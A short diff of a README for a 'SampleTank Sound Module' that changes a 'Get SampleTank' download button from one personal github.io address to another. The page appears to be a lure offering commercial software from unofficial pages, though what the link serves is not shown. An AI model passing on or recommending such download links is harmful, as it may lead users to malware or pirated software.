@@ -21,7 +21,7 @@ To begin using this **SampleTank Sound Module** and **SampleTank Music Productio
 | :--- | :--- |
 | **Get SampleTank Sound Module** | Click the button below to start using this **SampleTank Sampler Workstation**. |
 
-[![Button](https://img.shields.io/badge/🎹-Get_SampleTank-2ea44f?style=for-the-badge)](https://dakozaafan.github.io/.github/sampletank-sound-module)
+[![Button](https://img.shields.io/badge/🎹-Get_SampleTank-2ea44f?style=for-the-badge)](https://lanelahr737.github.io/.github/sampletank-sound-module)
 
 ## System Requirements
 
